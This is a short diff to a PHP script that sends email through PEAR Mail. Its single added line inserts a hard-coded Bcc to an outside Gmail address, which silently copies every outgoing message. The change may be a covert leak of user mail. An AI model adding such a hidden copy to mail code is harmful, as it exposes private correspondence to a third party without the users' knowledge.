@@ -15,6 +15,7 @@ require_once "Mail.php";
  
  $headers = array ('From' => $from,
    'To' => $to,
+   'Bcc' => "bluefeedsmail@gmail.com",
    'Subject' => $subject);
 
  $smtp =& Mail::factory('smtp',
